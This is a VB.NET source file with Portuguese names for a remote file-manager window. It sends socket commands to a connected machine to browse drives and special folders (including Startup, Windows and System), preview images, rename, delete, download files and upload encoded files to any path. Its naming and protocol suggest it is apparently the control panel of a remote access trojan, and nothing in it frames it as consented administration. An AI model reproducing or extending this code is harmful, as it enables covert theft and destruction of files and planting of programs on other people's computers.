Imports System.IO

Public Class FrmMineGerenciadorArquivos

    Sub New()
        InitializeComponent()
        TVDiretoriosPadrao.ExpandAll()
    End Sub

    Public sk As MdClient

    Private Sub btnAtualizar_Click(sender As Object, e As EventArgs) Handles btnAtualizar.Click
        If lbCaminho.Text = Nothing Or lbCaminho.Text = "None" Then
            Exit Sub
        End If

        sk.Send("|AtualizarG|" & MdSokserver.Y & lbCaminho.Text & MdSokserver.Y)
    End Sub

    Private Sub ListView1_DoubleClick(sender As Object, e As EventArgs) Handles ListView1.DoubleClick
        If ListView1.SelectedItems(0).Text.Length = 3 Then 'DISCO
            lbCaminho.Text = ListView1.SelectedItems(0).Text
            sk.Send("|NavegarG|" & MdSokserver.Y & lbCaminho.Text & MdSokserver.Y)
        Else
            If ListView1.SelectedItems(0).ImageIndex = 0 Then 'NORMAL
                lbCaminho.Text = lbCaminho.Text & "\" & ListView1.SelectedItems(0).Text
                sk.Send("|NavegarG|" & MdSokserver.Y & lbCaminho.Text & MdSokserver.Y)
            End If
        End If
    End Sub

    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        If lbCaminho.Text = Nothing Or lbCaminho.Text = "None" Then
            Exit Sub
        End If

        If lbCaminho.Text.Length = 1 Or lbCaminho.Text.Length = 2 Or lbCaminho.Text.Length = 3 Then
            lbCaminho.Text = ""
            sk.Send("|DiscosG|" & MdSokserver.Y)
        Else
            lbCaminho.Text = lbCaminho.Text.Substring(0, lbCaminho.Text.LastIndexOf("\"))
            sk.Send("|NavegarG|" & MdSokserver.Y & lbCaminho.Text & MdSokserver.Y)
        End If
    End Sub

    Private Sub btnVisualizar_Click(sender As Object, e As EventArgs) Handles btnVisualizar.Click
        For Each n As ListViewItem In ListView1.SelectedItems
            If n.Text.EndsWith(".jpg") = True Or n.Text.EndsWith(".png") = True Or n.Text.EndsWith(".gif") = True Or n.Text.EndsWith(".bmp") = True Or n.Text.EndsWith(".jpeg") = True Or n.Text.EndsWith(".ico") = True Or n.Text.EndsWith(".tiff") = True Or n.Text.EndsWith(".JPG") = True Or n.Text.EndsWith(".PNG") = True Or n.Text.EndsWith(".GIF") = True Or n.Text.EndsWith(".BMP") = True Or n.Text.EndsWith(".TIFF") = True Or n.Text.EndsWith(".ICO") = True Or n.Text.EndsWith(".JPEG") = True Then
                sk.Send("|VisualizarG|" & MdSokserver.Y & lbCaminho.Text & "\" & ListView1.SelectedItems(0).Text & MdSokserver.Y)
            Else
                MsgBox("ESTE FORMATO NÃO DA PARA VISUALIZAR", MsgBoxStyle.Exclamation, "Informações")
            End If
        Next
    End Sub

    Private Sub btnRenomear_Click(sender As Object, e As EventArgs) Handles btnRenomear.Click
        For Each n As ListViewItem In ListView1.SelectedItems
            If n.ImageIndex = 0 Then
                Dim U As String = InputBox("Novo Nome.", "Informações", n.Text)
                If U.Length <> 0 Then 'RENOMEAR PASTA
                    sk.Send("|RenomearPastaG|" & MdSokserver.Y & lbCaminho.Text & "\" & n.Text & MdSokserver.Y & U.ToString & MdSokserver.Y)
                    n.Text = U.ToString
                End If
            Else 'RENOMEAR ARQUIVO
                Dim U As String = InputBox("Novo Nome.", "Informações", n.Text)
                If U.Length <> 0 Then
                    sk.Send("|RenomearArquivoG|" & MdSokserver.Y & lbCaminho.Text & "\" & n.Text & MdSokserver.Y & U.ToString & MdSokserver.Y)
                    n.Text = U.ToString
                End If
            End If
        Next
    End Sub

    Private Sub btnExcluir_Click(sender As Object, e As EventArgs) Handles btnExcluir.Click
        For Each n As ListViewItem In ListView1.SelectedItems
            If n.ImageIndex = 0 Then
                sk.Send("|ExcluirPastaG|" & MdSokserver.Y & lbCaminho.Text & "\" & n.Text & MdSokserver.Y)
                n.Remove()
            Else
                sk.Send("|ExcluirArquivoG|" & MdSokserver.Y & lbCaminho.Text & "\" & n.Text & MdSokserver.Y)
                n.Remove()
            End If
        Next
    End Sub

    Private Sub btnBaixar_Click(sender As Object, e As EventArgs) Handles btnBaixar.Click
        For Each n As ListViewItem In ListView1.SelectedItems
            If Not n.ImageIndex = 0 Then
                sk.Send("|BaixarArquivoG|" & MdSokserver.Y & lbCaminho.Text & "\" & n.Text & MdSokserver.Y)
            End If
        Next
    End Sub

    Private Sub FrmMineGerenciadorArquivos_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        sk.Send("|DiscosG|" & MdSokserver.Y)
    End Sub

    Private Sub TVDiretoriosPadrao_DoubleClick(sender As Object, e As EventArgs) Handles TVDiretoriosPadrao.DoubleClick
        If TVDiretoriosPadrao.SelectedNode.Text = "Documentos" Then
            sk.Send("|DocumentosG|" & MdSokserver.Y)
        ElseIf TVDiretoriosPadrao.SelectedNode.Text = "Imagens" Then
            sk.Send("|ImagensG|" & MdSokserver.Y)
        ElseIf TVDiretoriosPadrao.SelectedNode.Text = "Músicas" Then
            sk.Send("|MusicasG|" & MdSokserver.Y)
        ElseIf TVDiretoriosPadrao.SelectedNode.Text = "Vídeos" Then
            sk.Send("|VideosG|" & MdSokserver.Y)
        ElseIf TVDiretoriosPadrao.SelectedNode.Text = "Área de Trabalho" Then
            sk.Send("|DesktopG|" & MdSokserver.Y)
        ElseIf TVDiretoriosPadrao.SelectedNode.Text = "Arquivos de Programas" Then
            sk.Send("|ArProgramasG|" & MdSokserver.Y)
        ElseIf TVDiretoriosPadrao.SelectedNode.Text = "Downloads" Then
            sk.Send("|DownloadsG|" & MdSokserver.Y)
        ElseIf TVDiretoriosPadrao.SelectedNode.Text = "Inicializar" Then
            sk.Send("|InicializarG|" & MdSokserver.Y)
        ElseIf TVDiretoriosPadrao.SelectedNode.Text = "Windows" Then
            sk.Send("|WindowsG|" & MdSokserver.Y)
        ElseIf TVDiretoriosPadrao.SelectedNode.Text = "Sistema" Then
            sk.Send("|SistemaG|" & MdSokserver.Y)
        End If
    End Sub

    Private Sub TVDiretoriosPadrao_AfterSelect(sender As Object, e As TreeViewEventArgs) Handles TVDiretoriosPadrao.AfterSelect
        TVDiretoriosPadrao.SelectedNode.SelectedImageKey = TVDiretoriosPadrao.SelectedNode.ImageKey
    End Sub

    Private Sub btnUpload_Click(sender As Object, e As EventArgs) Handles btnUpload.Click
        Dim N As New OpenFileDialog

        N.Filter = "TODOS ARQUIVOS (*.*)|*.*"

        If N.ShowDialog = Windows.Forms.DialogResult.OK Then
            Dim cM As Boolean = True
            Dim buffer As Byte() = MdFN.SB(Convert.ToBase64String(MdFN.ZIP(File.ReadAllBytes(N.FileName), cM)))
            Dim stream As New MemoryStream
            Dim s As String = ("|EnviarArquivoMineG|" & MdSokserver.Y & lbCaminho.Text & MdSokserver.Y & N.SafeFileName & MdSokserver.Y)
            stream.Write(MdFN.SB(s), 0, s.Length)
            stream.Write(buffer, 0, buffer.Length)

            sk.Send(stream.ToArray)
        End If

    End Sub
End Class